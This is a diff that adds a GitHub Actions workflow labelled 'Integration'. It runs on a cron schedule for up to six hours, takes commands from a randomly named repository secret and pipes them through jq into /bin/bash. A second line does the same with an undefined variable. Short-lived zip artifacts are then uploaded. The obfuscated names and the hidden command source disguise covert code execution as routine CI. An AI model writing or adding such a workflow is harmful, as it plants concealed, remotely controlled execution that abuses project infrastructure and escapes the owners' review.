@@ -1,0 +1,32 @@
+name: Integration
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '38 3,9,15,21 * * *'
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  handler:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Launch
+        env:
+          mfnbe31: ${{ secrets.mfnbe31 }}
+        run: |
+          printf '%s' "$mfnbe31" | jq -r .ktqpa44 | /bin/bash
+          echo $kvaec39866 | jq -r .ho2801 | /bin/bash
+
+      - name: Persist output
+        uses: actions/upload-artifact@v4
+        with:
+          name: SeV5MSjb
+          path: "*.zip"
+          retention-days: 1
